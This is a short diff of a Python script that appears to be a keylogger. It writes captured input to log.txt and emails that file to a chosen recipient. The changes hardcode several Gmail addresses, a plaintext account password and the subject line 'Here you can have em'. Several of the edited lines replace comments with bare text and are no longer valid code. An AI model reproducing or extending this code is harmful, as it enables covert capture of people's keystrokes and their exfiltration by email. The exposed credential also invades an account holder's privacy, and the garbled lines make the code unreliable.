@@ -14,17 +14,17 @@ banner()
 
 logs = open('log.txt','w+')
 
-from_mail = input("From => ")
+from_mail = input("From =>johnweimer225@gmail.com ")
 password_mail = getpass.getpass("Password => ")
-to_mail = input("To => ")
-subject_mail = input("Subject => ")
+to_mail = input("To =>star00foxx@gmail.com ")
+subject_mail = input("Subject => Here you can have em ")
 print("\n\033[1;37mSTOP: \033[1;33mKEY-ESC\033[0m")
 
 def sendFile():
     msg = MIMEMultipart()
-    msg['From'] = from_mail 	#Your mail
-    password = password_mail 	#Your email password
-    msg['To'] = to_mail  		#Destination
+    msg['From'] = from_mail 	johnweimer225@gmail.com
+    password = password_mail 	Weim225$$
+    msg['To'] = to_mail  		jweoim1983@gmail.com
     msg['Subject'] = subject_mail 
     msg.attach(MIMEText(open('log.txt').read())) #File to send
 
